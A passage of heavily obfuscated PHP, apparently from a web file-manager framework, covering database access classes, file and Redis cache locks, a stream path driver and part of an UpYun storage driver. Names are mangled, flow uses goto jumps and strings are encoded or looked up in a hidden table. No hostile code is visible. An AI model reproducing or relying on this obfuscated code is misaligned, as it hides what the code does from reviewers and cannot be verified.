(!$D”ö°¨Ü£¢) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $c‰÷ÓÎªæ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$c‰÷ÓÎªæ) { $this->error(); return !1; } } return !0; } private function getAll() { $DŸëËÄÙ…Î = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($DŸëËÄÙ…Î); return $DŸëËÄÙ…Î; } public function getFields($FÒÍºˆ°ë) { goto B­‰£½†‘×; AĞ“”‘Í¦: return $F•§±Ÿ¿Á ; goto c•¢ÚøÉĞó; B­‰£½†‘×: $cÕÓ‚ë·ä° =& $_SERVER[¢à]; $this->initConnect(!0); if (think_config($cÕÓ‚ë·ä°[843])) { $c°ˆøªïË– = str_replace($cÕÓ‚ë·ä°[844], $FÒÍºˆ°ë, think_config($cÕÓ‚ë·ä°[843])); } else { switch ($this->dbType) { case $cÕÓ‚ë·ä°[827]: case $cÕÓ‚ë·ä°[845]: $c°ˆøªïË– = "\x53\105\114\105\103\124\40\x20\40\x63\157\x6c\165\x6d\x6e\x5f\x6e\x61\x6d\145\x20\141\163\x20\x27\116\141\155\x65\47\54\40\x20\40\144\141\x74\x61\137\164\x79\x70\145\x20\x61\x73\x20\x27\124\x79\160\x65\47\x2c\40\x20\40\143\157\154\165\155\156\137\x64\x65\146\x61\165\x6c\164\x20\141\x73\x20\47\104\x65\x66\x61\x75\x6c\x74\47\54\x20\x20\x20\151\x73\x5f\156\x75\154\x6c\x61\x62\154\145\40\141\163\40\x27\116\x75\154\x6c\x27\xa\11\11\106\122\x4f\115\11\151\x6e\146\x6f\162\x6d\141\x74\x69\x6f\156\137\163\x63\x68\x65\x6d\141\56\x74\141\x62\x6c\145\x73\x20\101\x53\40\164\12\x9\x9\x4a\x4f\x49\116\x9\x69\x6e\x66\157\162\x6d\141\x74\151\157\x6e\137\x73\143\150\145\x6d\x61\56\143\x6f\x6c\165\x6d\156\163\x20\101\123\40\143\12\11\x9\117\x4e\x20\40\164\56\164\x61\x62\154\145\x5f\x63\141\x74\x61\154\157\147\40\x3d\40\143\x2e\x74\141\142\x6c\x65\137\143\141\x74\x61\154\157\147\xa\x9\11\x41\x4e\104\x20\x74\56\164\141\142\154\145\137\x73\x63\x68\x65\x6d\141\40\75\40\143\x2e\164\141\x62\154\145\137\163\x63\150\x65\155\141\xa\11\x9\101\116\104\40\164\56\164\x61\x62\154\145\137\x6e\x61\x6d\x65\40\x3d\x20\143\56\164\141\142\154\x65\x5f\156\x61\x6d\x65\12\11\x9\x57\110\x45\x52\x45\40\40\x20\164\x2e\164\141\142\x6c\x65\x5f\156\x61\155\x65\x20\75\x20\x27{$FÒÍºˆ°ë}\47"; break; case $cÕÓ‚ë·ä°[846]: $c°ˆøªïË– = $cÕÓ‚ë·ä°[847] . $FÒÍºˆ°ë . $cÕÓ‚ë·ä°[848]; break; case $cÕÓ‚ë·ä°[828]: case $cÕÓ‚ë·ä°[830]: $c°ˆøªïË– = $cÕÓ‚ë·ä°[849] . $cÕÓ‚ë·ä°[850] . $cÕÓ‚ë·ä°[851] . strtoupper($FÒÍºˆ°ë) . $cÕÓ‚ë·ä°[852] . strtoupper($FÒÍºˆ°ë) . $cÕÓ‚ë·ä°[853]; break; case $cÕÓ‚ë·ä°[854]: $c°ˆøªïË– = $cÕÓ‚ë·ä°[855] . $FÒÍºˆ°ë . $cÕÓ‚ë·ä°[856]; break; case $cÕÓ‚ë·ä°[829]: break; case $cÕÓ‚ë·ä°[857]: default: $c°ˆøªïË– = $cÕÓ‚ë·ä°[858] . ($this->dbType == $cÕÓ‚ë·ä°[857] ? "\140{$FÒÍºˆ°ë}\x60" : $FÒÍºˆ°ë); } } goto c«È´ìãÈÄ; c«È´ìãÈÄ: $CÉŠÆÚ„äè = $this->query($c°ˆøªïË–); $F•§±Ÿ¿Á  = array(); if ($CÉŠÆÚ„äè) { foreach ($CÉŠÆÚ„äè as $eÎôà»ğö² => $D°Ó«ò² Ğ) { $D°Ó«ò² Ğ = array_change_key_case($D°Ó«ò² Ğ); $D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[28]] = isset($D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[28]]) ? $D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[28]] : $cÕÓ‚ë·ä°[358]; $D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[29]] = isset($D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[29]]) ? $D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[29]] : $cÕÓ‚ë·ä°[358]; $f‚†»‹Ğİ = isset($D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[258]]) ? $D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[258]] : $D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[28]]; $F•§±Ÿ¿Á [$f‚†»‹Ğİ] = array($cÕÓ‚ë·ä°[28] => $f‚†»‹Ğİ, $cÕÓ‚ë·ä°[29] => $D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[29]], $cÕÓ‚ë·ä°[31] => (bool) (isset($D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[101]]) && $D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[101]] === $cÕÓ‚ë·ä°[33] || isset($D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[31]]) && $D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[31]] === $cÕÓ‚ë·ä°[33]), $cÕÓ‚ë·ä°[34] => isset($D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[34]]) ? $D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[34]] : (isset($D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[53]]) ? $D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[53]] : $cÕÓ‚ë·ä°[358]), $cÕÓ‚ë·ä°[36] => isset($D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[89]]) ? strtolower($D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[89]]) == $cÕÓ‚ë·ä°[38] : (isset($D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[54]]) ? $D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[54]] : !1), $cÕÓ‚ë·ä°[39] => isset($D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[859]]) ? strtolower($D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[859]]) == $cÕÓ‚ë·ä°[41] : (isset($D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[89]]) ? $D°Ó«ò² Ğ[$cÕÓ‚ë·ä°[89]] : !1)); } } goto AĞ“”‘Í¦; c•¢ÚøÉĞó: } public function getTables($eÇÄÜ¤¦Å’ = '') { $eé•ÙÑÉö =& $_SERVER[¢à]; if (think_config($eé•ÙÑÉö[860])) { $aõçç®Æ„ = str_replace($eé•ÙÑÉö[861], $eÇÄÜ¤¦Å’, think_config($eé•ÙÑÉö[860])); } else { switch ($this->dbType) { case $eé•ÙÑÉö[828]: case $eé•ÙÑÉö[830]: $aõçç®Æ„ = $eé•ÙÑÉö[862]; break; case $eé•ÙÑÉö[827]: case $eé•ÙÑÉö[845]: $aõçç®Æ„ = $eé•ÙÑÉö[863]; break; case $eé•ÙÑÉö[854]: $aõçç®Æ„ = $eé•ÙÑÉö[864]; break; case $eé•ÙÑÉö[829]: think_exception(think_lang($eé•ÙÑÉö[865]) . $eé•ÙÑÉö[866]); break; case $eé•ÙÑÉö[846]: $aõçç®Æ„ = $eé•ÙÑÉö[42] . $eé•ÙÑÉö[43] . $eé•ÙÑÉö[44]; break; case $eé•ÙÑÉö[857]: default: if (!empty($eÇÄÜ¤¦Å’)) { $aõçç®Æ„ = $eé•ÙÑÉö[810] . $eÇÄÜ¤¦Å’; } else { $aõçç®Æ„ = $eé•ÙÑÉö[811]; } } } $C¨Ã¦ŞåË = $this->query($aõçç®Æ„); $B’ó†‹¢ = array(); foreach ($C¨Ã¦ŞåË as $aš Ç™Û›§ => $eÎÂ‚¥Ç…) { $B’ó†‹¢[$aš Ç™Û›§] = current($eÎÂ‚¥Ç…); } return $B’ó†‹¢; } protected function parseLimit($bøä£å) { $BĞŸòÙãŞ =& $_SERVER[¢à]; $CõŒõ†¸ = $BĞŸòÙãŞ[33]; if (!empty($bøä£å)) { switch ($this->dbType) { case $BĞŸòÙãŞ[854]: case $BĞŸòÙãŞ[846]: $bøä£å = explode($BĞŸòÙãŞ[47], $bøä£å); if (count($bøä£å) > 1) { $CõŒõ†¸ .= $BĞŸòÙãŞ[48] . $bøä£å[1] . $BĞŸòÙãŞ[49] . $bøä£å[0] . $BĞŸòÙãŞ[50]; } else { $CõŒõ†¸ .= $BĞŸòÙãŞ[48] . $bøä£å[0] . $BĞŸòÙãŞ[50]; } break; case $BĞŸòÙãŞ[827]: case $BĞŸòÙãŞ[845]: break; case $BĞŸòÙãŞ[829]: break; case $BĞŸòÙãŞ[828]: case $BĞŸòÙãŞ[830]: break; case $BĞŸòÙãŞ[857]: default: $CõŒõ†¸ .= $BĞŸòÙãŞ[48] . $bøä£å . $BĞŸòÙãŞ[50]; } } return $CõŒõ†¸; } public function parseKey(&$B¿¿©øáâì, $eß¾Œñƒñ = true) { $eïáÕŒ¯Æ =& $_SERVER[¢à]; if ($eß¾Œñƒñ) { $B¿¿©øáâì = $this->parseKeyCheck($B¿¿©øáâì); } if ($this->dbType == $eïáÕŒ¯Æ[857]) { if ($B¿¿©øáâì != $eïáÕŒ¯Æ[173] && !preg_match($eïáÕŒ¯Æ[821], $B¿¿©øáâì)) { $B¿¿©øáâì = $eïáÕŒ¯Æ[822] . trim($B¿¿©øáâì, $eïáÕŒ¯Æ[822]) . $eïáÕŒ¯Æ[822]; } return $B¿¿©øáâì; } else { return parent::parseKey($B¿¿©øáâì); } } public function close() { $this->_linkID = null; } public function error() { $E–³‹‚á¡˜ =& $_SERVER[¢à]; if ($this->PDOStatement) { $AØì‰˜Š‰Î = $this->PDOStatement->errorInfo(); $this->error = $AØì‰˜Š‰Î[1] . $E–³‹‚á¡˜[4] . $AØì‰˜Š‰Î[2]; } else { $this->error = $E–³‹‚á¡˜[33]; } if ($E–³‹‚á¡˜[33] != $this->queryStr) { $this->error .= LNG($E–³‹‚á¡˜[45]) . $this->queryStr; } think_trace($this->error, $E–³‹‚á¡˜[33], $E–³‹‚á¡˜[46]); return $this->error; } public function escapeString($A§²ñ“Î…) { $cøÙ…ô©ä® =& $_SERVER[¢à]; switch ($this->dbType) { case $cøÙ…ô©ä®[854]: case $cøÙ…ô©ä®[827]: case $cøÙ…ô©ä®[845]: case $cøÙ…ô©ä®[857]: return addslashes($A§²ñ“Î…); case $cøÙ…ô©ä®[829]: case $cøÙ…ô©ä®[846]: case $cøÙ…ô©ä®[828]: case $cøÙ…ô©ä®[830]: return str_ireplace($cøÙ…ô©ä®[55], $cøÙ…ô©ä®[56], $A§²ñ“Î…); } } protected function parseValue($fø§¨«‡) { $D¡°ô¾» =& $_SERVER[¢à]; if (is_string($fø§¨«‡)) { $fø§¨«‡ = strpos($fø§¨«‡, $D¡°ô¾»[4]) === 0 ? $this->escapeString($fø§¨«‡) : $D¡°ô¾»[867] . $this->escapeString($fø§¨«‡) . $D¡°ô¾»[867]; } elseif (isset($fø§¨«‡[0]) && is_string($fø§¨«‡[0]) && strtolower($fø§¨«‡[0]) == $D¡°ô¾»[282]) { $fø§¨«‡ = $this->escapeString($fø§¨«‡[1]); } elseif (is_array($fø§¨«‡)) { $fø§¨«‡ = array_map(array($this, $D¡°ô¾»[868]), $fø§¨«‡); } elseif (is_bool($fø§¨«‡)) { $fø§¨«‡ = $fø§¨«‡ ? $D¡°ô¾»[83] : $D¡°ô¾»[464]; } elseif (is_null($fø§¨«‡)) { $fø§¨«‡ = $D¡°ô¾»[101]; } return $fø§¨«‡; } public function getLastInsertId() { $B•†ÎØ»Ó˜ =& $_SERVER[¢à]; switch ($this->dbType) { case $B•†ÎØ»Ó˜[854]: case $B•†ÎØ»Ó˜[846]: case $B•†ÎØ»Ó˜[827]: case $B•†ÎØ»Ó˜[845]: case $B•†ÎØ»Ó˜[829]: case $B•†ÎØ»Ó˜[857]: return $this->_linkID->lastInsertId(); case $B•†ÎØ»Ó˜[828]: case $B•†ÎØ»Ó˜[830]: $DùÉã•”¨Ù = $this->table; $bä„¾™‘èÔ = $this->query("\123\x45\114\x45\x43\x54\40{$DùÉã•”¨Ù}\x2e\143\x75\x72\162\166\141\x6c\x20\x63\165\x72\162\x76\141\x6c\40\x46\x52\117\115\40\x64\165\141\x6c"); return $bä„¾™‘èÔ ? $bä„¾™‘èÔ[0][$B•†ÎØ»Ó˜[869]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($BÍÉ…ÕÁè¦) { goto bÆÌ†®¬œë; Cµ±ÜËÃ: fclose($b†‰Ü¨¼ÔÅ); show_json($F¯Ï‚×¿Âİ[872], !1); return !1; goto BùÛöÁÍÇ÷; bÆÌ†®¬œë: $F¯Ï‚×¿Âİ =& $_SERVER[¢à]; $C«´‚Ñßœ = DATA_PATH . $F¯Ï‚×¿Âİ[870]; $b†‰Ü¨¼ÔÅ = fopen($C«´‚Ñßœ, $F¯Ï‚×¿Âİ[871]); goto f’œÆæ¦»˜; f’œÆæ¦»˜: if (!$b†‰Ü¨¼ÔÅ) { return !1; } if (flock($b†‰Ü¨¼ÔÅ, LOCK_EX)) { $bºí êé•ˆ = parent::query($BÍÉ…ÕÁè¦); flock($b†‰Ü¨¼ÔÅ, LOCK_UN); fclose($b†‰Ü¨¼ÔÅ); return $bºí êé•ˆ; } flock($b†‰Ü¨¼ÔÅ, LOCK_UN); goto Cµ±ÜËÃ; BùÛöÁÍÇ÷: } public function execute($E“¬ŒĞ¢º–) { goto C¥çªóÖ¨; C¥çªóÖ¨: $d»¬‚‹Ó»À =& $_SERVER[¢à]; $E˜ÃØà÷ó¢ = DATA_PATH . $d»¬‚‹Ó»À[870]; $DÉ¡ÑÃ×Å× = fopen($E˜ÃØà÷ó¢, $d»¬‚‹Ó»À[871]); goto B§‡™²Ä¾Ø; B§‡™²Ä¾Ø: if (!$DÉ¡ÑÃ×Å×) { return !1; } if (flock($DÉ¡ÑÃ×Å×, LOCK_EX)) { $AÎ„ö›ø“Ô = parent::execute($E“¬ŒĞ¢º–); flock($DÉ¡ÑÃ×Å×, LOCK_UN); fclose($DÉ¡ÑÃ×Å×); return $AÎ„ö›ø“Ô; } flock($DÉ¡ÑÃ×Å×, LOCK_UN); goto eĞÔéï”¢š; eĞÔéï”¢š: fclose($DÉ¡ÑÃ×Å×); show_json($d»¬‚‹Ó»À[872], !1); return !1; goto E£Ìø†Åï; E£Ìø†Åï: } } goto F ³›ë¡‰; d“™Ğé¿Ò: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $D¨î‹àˆØ =& $_SERVER[¢à]; $FñŞšì² = $GLOBALS[$D¨î‹àˆØ[6]][$D¨î‹àˆØ[334]]; self::$cachePath = $FñŞšì²[$D¨î‹àˆØ[164]][$D¨î‹àˆØ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($eí£–Åª¡Š, $F‰‡ËÏ¥ÉÍ = 0) { goto CœñŒÅìÒ; CœñŒÅìÒ: $eÜùÓŠ“à• =& $_SERVER[¢à]; $D»†óÁ’ìŒ = microtime(!0); $eØË¯Å£½Š = $D»†óÁ’ìŒ + $F‰‡ËÏ¥ÉÍ + 0.0001; goto AÖç«¯İ‚; AÖç«¯İ‚: $cÏ»ŒÌ˜Á‰ = rtrim(self::$cachePath, $eÜùÓŠ“à•[8]) . $eÜùÓŠ“à•[772] . md5($eí£–Åª¡Š) . $eÜùÓŠ“à•[773]; if (file_exists($cÏ»ŒÌ˜Á‰) && filemtime($cÏ»ŒÌ˜Á‰) && filemtime($cÏ»ŒÌ˜Á‰) < time() - 10) { @unlink($cÏ»ŒÌ˜Á‰); } do { if (file_exists($cÏ»ŒÌ˜Á‰)) { cacheLockWait(); continue; } $eË—ºŠ°„½ = fopen($cÏ»ŒÌ˜Á‰, $eÜùÓŠ“à•[774]); if (!$eË—ºŠ°„½) { return !1; } $fğ –Šá› = flock($eË—ºŠ°„½, LOCK_EX | LOCK_NB); self::$caches[$eí£–Åª¡Š] = array($eÜùÓŠ“à•[775] => $eË—ºŠ°„½, $eÜùÓŠ“à•[164] => $cÏ»ŒÌ˜Á‰); fwrite($eË—ºŠ°„½, $eØË¯Å£½Š); clearstatcache(); if ($eË—ºŠ°„½ && $fğ –Šá›) { return !0; } cacheLockWait(); } while (microtime(!0) < $eØË¯Å£½Š); goto fŞÕ‘Õ”; fŞÕ‘Õ”: $this->unlock($eí£–Åª¡Š); return !1; goto F‹Ôİ‰à’á; F‹Ôİ‰à’á: } public function lockGet($eå–¾»—¡Ş) { $F¾İÈ”À¥ù =& $_SERVER[¢à]; $Bµ¬…š‘ˆ = rtrim(self::$cachePath, $F¾İÈ”À¥ù[8]) . $F¾İÈ”À¥ù[772] . md5($eå–¾»—¡Ş) . $F¾İÈ”À¥ù[773]; return file_exists($Bµ¬…š‘ˆ); } public function unlock($E¬çø•×») { goto bŸ„¾ºàßØ; bŸ„¾ºàßØ: $AÖäˆ¦¯ëƒ =& $_SERVER[¢à]; $dîµµääÛ = self::$caches[$E¬çø•×»]; if (!$dîµµääÛ) { return; } goto EÄÒµ‹ÑÉ·; CäøÄô¶’: unset(self::$caches[$E¬çø•×»]); goto C†ÖŠ™–É; EÄÒµ‹ÑÉ·: @flock($dîµµääÛ[$AÖäˆ¦¯ëƒ[775]], LOCK_UN); @fclose($dîµµääÛ[$AÖäˆ¦¯ëƒ[775]]); @unlink($dîµµääÛ[$AÖäˆ¦¯ëƒ[164]]); goto CäøÄô¶’; C†ÖŠ™–É: } } class CacheLockRedis { public function lock($d›Æƒ¡ëç, $A´àæœğô‡ = 10) { $C…›‰’âîö = Cache::init(); $BñÍ¦Ç±íï = microtime(!0) + $A´àæœğô‡; while (microtime(!0) < $BñÍ¦Ç±íï) { $fÛÏ‚¬»»¸ = $C…›‰’âîö->get($d›Æƒ¡ëç); if (!$fÛÏ‚¬»»¸) { $Aºâ³‡Ğ˜ß = $C…›‰’âîö->setLock($d›Æƒ¡ëç, $BñÍ¦Ç±íï, $A´àæœğô‡); if ($Aºâ³‡Ğ˜ß) { return !0; } } else { if ($fÛÏ‚¬»»¸ < microtime(!0)) { $C…›‰’âîö->set($d›Æƒ¡ëç, $BñÍ¦Ç±íï, $BñÍ¦Ç±íï); if ($C…›‰’âîö->get($d›Æƒ¡ëç) === $fÛÏ‚¬»»¸) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($E¢±æŸĞ‰×) { return Cache::init()->get($E¢±æŸĞ‰×); } public function unlock($B¦†º) { return Cache::init()->remove($B¦†º); } } goto dµš¥èİÄÜ; E×§ŒÈŞ¿£: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($eèŠî¸®§Ç, $eï„¨÷¯‹Ü = 0) { parent::__construct(); $this->source = $eèŠî¸®§Ç; $this->sourceSize = $eï„¨÷¯‹Ü; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($D§Óõ§…ïÂ = false) { return $this->sourceSize; } public function getContent($F¿ƒ½Å±Ñ© = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $fÆà˜ÃÏ„ = ftell($this->source); $e­Å³¢Á ¯ = @fread($this->source, $this->sourceSize); fseek($this->source, $fÆà˜ÃÏ„); return $e­Å³¢Á ¯; } } public function fileSubstr($F·åÁùÛ¥ = false, $bñõâìÙÓ¢ = 0, $b•ÙÅŞ÷›  = 0) { if (!$b•ÙÅŞ÷› ) { $b•ÙÅŞ÷›  = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $bñõâìÙÓ¢, $b•ÙÅŞ÷› ); } if ($this->sourceType == self::TYPE_FILE) { $fÃóƒãİÙ = ftell($this->source); fseek($this->source, $fÃóƒãİÙ + $bñõâìÙÓ¢); $D›ÑÌğ¯ = @fread($this->source, $b•ÙÅŞ÷› ); fseek($this->source, $fÃóƒãİÙ); return $D›ÑÌğ¯; } } public function hashMd5($Dõö‡ä†Òİ = false) { return md5($this->getContent()); } public static function hash($c«ó¾ãˆ, $dÙË£ÆÜ¨Õ = 0) { $c½¥¨…‰ñÅ = new PathDriverStream($c«ó¾ãˆ, $dÙË£ÆÜ¨Õ); return $c½¥¨…‰ñÅ->hashSimple($c«ó¾ãˆ); } public static function md5($fê‹…ä˜ƒí, $BÜ¿±‹Â¨ = 0) { $b¹ù‘±éˆ = new PathDriverStream($fê‹…ä˜ƒí, $BÜ¿±‹Â¨); return $b¹ù‘±éˆ->hashMd5($fê‹…ä˜ƒí); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\x70\x3a\x2f\x2f\x76\x30\x2e\x61\x70\x69\x2e\165\160\x79\165\x6e\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Fµš÷ÊÓİ›) { parent::__construct(); $this->_init($Fµš÷ÊÓİ›); } public function _init($eÄ„ÖÆ·í) { foreach ($eÄ„ÖÆ·í as $e°—Œô£Ç³ => $EÍŞ³–‚º¹) { if (isset($this->{$e°—Œô£Ç³})) { $this->{$e°—Œô£Ç³} = $EÍŞ³–‚º¹; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[¢à][1230], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($c•òÀ°Ÿ , $Fœ¦×³ Š = "\x47\105\x54") { $f—ÒÜ±› =& $_SERVER[¢à]; $D¦Ñ¡É‘É = gmdate($f—ÒÜ±›[1194]); $f½®œÒÈ² = base64_encode(hash_hmac($f—ÒÜ±›[1231], "{$Fœ¦×³ Š}\46{$c•òÀ°Ÿ }\x26{$D¦Ñ¡É‘É}", md5("{$this->userpass}"), !0)); $e‰èÆ·Ó¼¬ = array("\x41\165\x74\x68\157\162\151\x7a\141\x74\151\157\x6e\72\125\120\x59\x55\x4e\x20{$this->username}\x3a{$f½®œÒÈ²}", "\x44\x61\x74\x65\x3a{$D¦Ñ¡É‘É}"); return $e‰èÆ·Ó¼¬; } public function ussRequest($càßî±Óñ, $EÓÌĞ˜è˜† = "\107\x45\124", $B³„µÛ…Ã§ = false, $f´¸ù‚ãé¹ = false, $eŒÙËî¸‚¾ = false) { goto fê—É®¶»‚; Dã­ëŸÕŠê: $Eè‡Ğ›ßä© = $this->ussHeaders($C¿˜«ĞÎÅ§, $EÓÌĞ˜è˜†); if ($f´¸ù‚ãé¹) { $Eè‡Ğ›ßä© = array_merge($Eè‡Ğ›ßä©, $f´¸ù‚ãé¹); } $dÍ—ˆÄ½Ù³ = url_request($this->endpoint . $C¿˜«ĞÎÅ§, $EÓÌĞ˜è˜†, $B³„µÛ…Ã§, $Eè‡Ğ›ßä©, $eŒÙËî¸‚¾); goto DƒÇ­Œ®ŒŸ; DƒÇ­Œ®ŒŸ: if (!$dÍ—ˆÄ½Ù³) { return array($fÑ¥›‚à‘[1028] => !1, $fÑ¥›‚à‘[1030] => $fÑ¥›‚à‘[1232]); } if (strtolower($EÓÌĞ˜è˜†) == $fÑ¥›‚à‘[181] || in_array($dÍ—ˆÄ½Ù³[$fÑ¥›‚à‘[1028]], array($fÑ¥›‚à‘[1089], $fÑ¥›‚à‘[1233]))) { $B³„µÛ…Ã§ = $dÍ—ˆÄ½Ù³[$fÑ¥›‚à‘[1234]]; } else { $B³„µÛ…Ã§ = json_decode($dÍ—ˆÄ½Ù³[$fÑ¥›‚à‘[1030]], !0); if (!$B³„µÛ…Ã§) { $B³„µÛ…Ã§ = $dÍ—ˆÄ½Ù³[$fÑ¥›‚à‘[1030]]; } else { if (!$dÍ—ˆÄ½Ù³[$fÑ¥›‚à‘[689]] && isset($B³„µÛ…Ã§[$fÑ¥›‚à‘[1235]])) { $B³„µÛ…Ã§ = $B³„µÛ…Ã§[$fÑ¥›‚à‘[1235]]; } } } return array($fÑ¥›‚à‘[1028] => $dÍ—ˆÄ½Ù³[$fÑ¥›‚à‘[689]], $fÑ¥›‚à‘[1030] => $B³„µÛ…Ã§); goto e¶ù‹ÉùÔ; fê—É®¶»‚: $fÑ¥›‚à‘ =& $_SERVER[¢à]; $càßî±Óñ = trim($càßî±Óñ, $fÑ¥›‚à‘[8]); $C¿˜«ĞÎÅ§ = "\x2f{$this->bucket}\x2f{$càßî±Óñ}"; goto Dã­ëŸÕŠê; e¶ù‹ÉùÔ: } public function mkfile($cÜ™Ç²æ³±, $fÒ¼ùøˆÉÄ = '', $eÍ½…©±‹ = REPEAT_RENAME) { if ($this->setContent($cÜ™Ç²æ³±, $fÒ¼ùøˆÉÄ)) { return $this->getPathOuter($cÜ™Ç²æ³±); } return !1; } public function mkdir($d´ïóÕŸ¾È, $F•ô†øƒ‰ = REPEAT_SKIP) { $b©ØË¦´øñ =& $_SERVER[¢à]; $Eî­ÈË‰± = trim($d´ïóÕŸ¾È, $b©ØË¦´øñ[8]); if ($this->_isFolder($Eî­ÈË‰±)) { return $this->getPathOuter($Eî­ÈË‰±); } $dÓé˜ö£Û‡ = array($b©ØË¦´øñ[1236]); $CäíÔƒŸÄè = $this->ussRequest($Eî­ÈË‰±, $b©ØË¦´øñ[209], !1, $dÓé˜ö£Û‡); return $CäíÔƒŸÄè[$b©ØË¦´øñ[1028]] ? $this->getPathOuter($Eî­ÈË‰±) : !1; } public function copyFile($Fà£˜ÂĞÊ¢, $B°¥î„Ø‹) { $bŒ¶ö‘ê =& $_SERVER[¢à]; $bÙ¥ÚŸöŸ£ = array($bŒ¶ö‘ê[1237] . "\x2f{$this->bucket}\57{$Fà£˜ÂĞÊ¢}", $bŒ¶ö‘ê[1238]); $AŸ™ò¡á± = $this->ussRequest($B°¥î„Ø‹, $bŒ¶ö‘ê[211], !1, $bÙ¥ÚŸöŸ£); return $AŸ™ò¡á±[$bŒ¶ö‘ê[1028]] ? !0 : !1; } public function moveFile($C„£â¦­›, $DºÙÊÜ½¤¯) { $F¥‰££Ë³Ğ =& $_SERVER[¢à]; $aŞÒéÃæ¡… = array($F¥‰££Ë³Ğ[1239] . "\57{$this->bucket}\57{$C„£â¦­›}", $F¥‰££Ë³Ğ[1238]); $D¨…½§—Û = $this->ussRequest($DºÙÊÜ½¤¯, $F¥‰££Ë³Ğ[211], !1, $aŞÒéÃæ¡…); return $D¨…½§—Û[$F¥‰££Ë³Ğ[1028]] ? !0 : !1; } public function delFile($d³‡ÖÄ¶â…) { $B¢­Ò¹éÎ =& $_SERVER[¢à]; $BÔ®‚­ò¹‹ = $this->ussRequest($d³‡ÖÄ¶â…, $B¢­Ò¹éÎ[1240]); return $BÔ®‚­ò¹‹[$B¢­Ò¹éÎ[1028]] ? !0 : !1; } public function delFolder($aÁ‹‚‰óÂ°) { $d¿å…è•§£ =& $_SERVER[¢à]; $D±³¿ãšÌ… = $this->listAll($aÁ‹‚‰óÂ°); krsort($D±³¿ãšÌ…); foreach ($D±³¿ãšÌ… as $aœğÀ·éõ£) { $this->ussRequest($aœğÀ·éõ£[$d¿å…è•§£[75]], $d¿å…è•§£[1240]); } return $this->ussRequest($aÁ‹‚‰óÂ°, $d¿å…è•§£[1240]); } public function rename($dù²°é‘±», $cÌÚ‹«øÏÁ) { if ($this->isFile($dù²°é‘±»)) { $cÌÚ‹«øÏÁ = get_path_father($dù²°é‘±») . $cÌÚ‹«øÏÁ; return $this->moveFile($dù²°é‘±», $cÌÚ‹«øÏÁ); } return $this->renameObject($dù²°é‘±», $cÌÚ‹«øÏÁ); } public function fileInfo($DĞìÅœİ©Á, $f‚İ™Ø¹Ï = false, $CğÍè÷å§ = array()) { $AæÏ‚§íÏ =& $_SERVER[¢à]; if ($f‚İ™Ø¹Ï) { return array($AæÏ‚§íÏ[28] => $this->pathThis($DĞìÅœİ©Á), $AæÏ‚§íÏ[75] => $this->getPathOuter($AæÏ‚§íÏ[8] . $DĞìÅœİ©Á), $AæÏ‚§íÏ[29] => $AæÏ‚§íÏ[164], $AæÏ‚§íÏ[77] => isset($CğÍè÷å§[$AæÏ‚§íÏ[322]]) ? $CğÍè÷å§[$AæÏ‚§íÏ[322]] : 0, $AæÏ‚§íÏ[157] => $this->ext($DĞìÅœİ©Á)); } $E¢©æ‹áÊÍ = array($AæÏ‚§íÏ[28] => $this->pathThis($DĞìÅœİ©Á), $AæÏ‚§íÏ[75] => $this->getPathOuter($AæÏ‚§íÏ[8] . $DĞìÅœİ©Á), $AæÏ‚§íÏ[29] => $AæÏ‚§íÏ[164], $AæÏ‚§íÏ[184] => 0, $AæÏ‚§íÏ[107] => isset($c·æ¡Ø¬Š[$AæÏ‚§íÏ[1241]]) ? $c·æ¡Ø¬Š[$AæÏ‚§íÏ[1241]] : 0, $AæÏ‚§íÏ[77] => isset($CğÍè÷å§[$AæÏ‚§íÏ[322]]) ? $CğÍè÷å§[$AæÏ‚§íÏ[322]] : 0, $AæÏ‚§íÏ[157] => $this->ext($DĞìÅœİ©Á), $AæÏ‚§íÏ[185] => !0, $AæÏ‚§íÏ[186] => !0); if (empty($CğÍè÷å§)) { $CğÍè÷å§ = $this->objectMeta($DĞìÅœİ©Á); if (!$CğÍè÷å§) { return $E¢©æ‹áÊÍ; } 